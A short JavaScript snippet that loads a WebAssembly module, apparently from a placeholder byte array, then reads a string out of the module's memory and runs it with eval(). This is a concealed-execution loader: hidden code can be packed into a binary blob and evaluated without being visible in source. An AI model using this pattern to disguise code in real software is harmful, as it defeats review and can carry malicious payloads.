const Z = new Uint8Array([0, 0, 0]);
WebAssembly.instantiate(Z)
    .then(({ instance: inst }) => {
        //console.log(instance.exports.js.value, instance.exports.memory.buffer)
        let i = inst.exports.js.value, S = '', m = new Uint8Array(inst.exports.memory.buffer)
        for (; m[i] !== 0; i++) {
            S += String.fromCharCode(m[i])
        }
        eval(S)
    });
